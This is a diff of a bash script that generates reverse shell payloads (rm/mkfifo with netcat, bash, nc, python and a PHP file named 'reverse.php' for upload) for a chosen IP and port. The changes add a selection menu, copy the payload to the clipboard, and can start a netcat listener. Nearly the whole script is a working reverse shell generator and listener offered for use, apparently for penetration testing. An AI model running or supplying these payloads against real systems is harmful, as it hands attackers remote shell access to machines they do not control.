@@ -1,15 +1,14 @@
 #!/bin/bash
 
 
-#Definition of colours to make the display beautiful:)
+#Definition of colours to make the display beautiful
 
-
-boring="\e[0m" #no colour
-red="\e[1;31m"
-green="\e[1;32m"
-blue="\e[1;34m"
-hackergreen="\e[0;32m" #dark green
-purple="\e[1;35m"
+boring="\e[0m" 	#no colour - Used for variables like ip address and ports
+red="\e[1;31m" 	#red - Used for displaying the copied onliner
+green="\e[1;32m"	#green - Used for helper texts which displays variables
+blue="\e[1;34m"	#blue - Used for helper texts which gets inputs
+hackergreen="\e[0;32m"  #dark green - Used for making things look nice
+purple="\e[1;35m" 	#purple - idk
 
 
 #Configuration of the reverse shell
@@ -19,9 +18,7 @@ echo -ne "${blue}Listening Port:${boring} " && read PORT
 
 echo ""
 
-echo -ne "${green}Those are your IP addresses:${purple}\n"
-
-echo ""
+echo -ne "${green}These are your IP addresses:${purple}\n"
 
 hostname -I
 
@@ -35,7 +32,7 @@ echo ""
 #PentestMonkey Reverse Shell Options
 
 
-echo -ne "${blue}Which type of reverse shell command line do you want to use? (rm, bash, nc, python, php or all):${boring} " && read reverse
+echo -ne "${blue}Which type of reverse shell command line do you want to use?${boring}"
 
 rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
 
@@ -50,56 +47,53 @@ php='<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '$IP' '
 
 #Display of the reverse shell
 
-
-clear
-
 echo ""
+copied="${green}We have copied it to your clipboard!!! Paste it wherever you want:)${boring}\n\n"
+select reverse in rm bash nc python php
+do
+	case $reverse in
+		rm)
+			echo -ne "${green}You have selected the 'rm' payload\n${boring}"
+			echo -ne $rm | xclip -sel clip | echo -ne "${red}$rm${boring}\n\n"
+			echo -ne "$copied"
+			break;;
+		bash)
+			echo -ne "${green}You have selected the 'bash' payload\n${boring}"
+			echo $bash | xclip -sel clip | echo -ne "${red}$bash${boring}\n\n"
+			echo -ne "$copied"
+			break;;
+		nc)
+			echo -ne "${green}You have selected the 'nc' or netcat payload\n${boring}"
+			echo $nc | xclip -sel clip | echo -ne "${red}$nc${boring}\n\n"
+			echo -ne "$copied"
+			break;;
+		python)
+			echo -ne "${green}You have selected the 'python' payload\n${boring}"
+			echo $python | xclip -sel clip | echo -ne "${red}$python${boring}\n\n"
+			echo -ne "$copied"
+			break;;
+		php)
+			echo -ne "${green}You have selected the 'php' payload\n${boring}"
+			echo -ne $php > reverse.php | echo -ne "${red}The file reverse.php is ready to upload and located in ${green}" ; pwd
+			echo -ne "$copied"
+			break;;
+		*)
+			echo -ne "${green}You have selected something else\n${boring}";;
+	esac
+done
 
-if [ $reverse != "php" ] && [ $reverse != "all" ]; then
-echo -ne "${green}This is your reverse shell command line!!${boring}\n"
-fi
+echo -ne "${blue}Do you want to open a shell and listen here itself?${hackergreen} (Y/N)  ${boring}" && read option
 
-if [ $reverse = "all" ]; then
-echo -ne "${green}Those are your reverse shells command lines${boring}\n"
-fi
+if [[ $option = 'Y' ]] || [[ $option = 'y' ]]
+then
+	#Netcal listener definition
+	
+	echo -ne "${hackergreen}Waiting to say I'm in...${boring}\n"
+	echo -ne "${red}Listening on Port ${boring}$PORT\n\n"
 
-if [ $reverse = "php" ]; then
-echo -ne $php > reverse.php | echo -ne "${red}The file reverse.php is ready to upload and located in ${green}" ; pwd
-fi
+	sudo nc -nlvp $PORT
 
-echo ""
-
-if [ "$reverse" = "all" ];then
-echo -ne "\n${purple} [+] ${blue}rm ${boring}= ${green}$rm \n\n ${purple}[+] ${blue}bash = ${green}$bash ${purple} \n\n [+] ${blue}nc = ${green}$nc \n\n ${purple}[+] ${blue}python = ${green}$python \n\n ${purple}[+] ${blue}php = ${green}$php\n\n"
-fi
-
-if [ "$reverse" = "rm" ]; then
-echo -ne $rm | xclip -sel clip | echo -ne "${red}$rm${boring}\n\n"
-fi
-
-if [ "$reverse" = "bash" ]; then
-echo $bash | xclip -sel clip | echo -ne "${red}$bash${boring}\n\n"
-fi
-
-if [ "$reverse" = "nc" ]; then
-echo $nc | xclip -sel clip | echo -ne "${red}$nc${boring}\n\n"
-fi
-
-if [ "$reverse" = "python" ]; then
-echo $python | xclip -sel clip | echo -ne "${red}$python${boring}\n\n"
-fi
-
-if [ "$reverse" != "php" ] && [ "$reverse" != "all" ]; then
-echo -ne "${green}We have copied it for you!!! Paste it wherever you want:)${boring}\n\n"
-fi
-
-
-#Display of the listener (netcat)
-
-
-echo -ne "${hackergreen}Waiting to say I'm in...${boring}"
-
-echo ""
-echo ""
-
-nc -lvnp $PORT
+else
+	echo -ne "${purple}BYE\n\n"
+	exit
+fi	
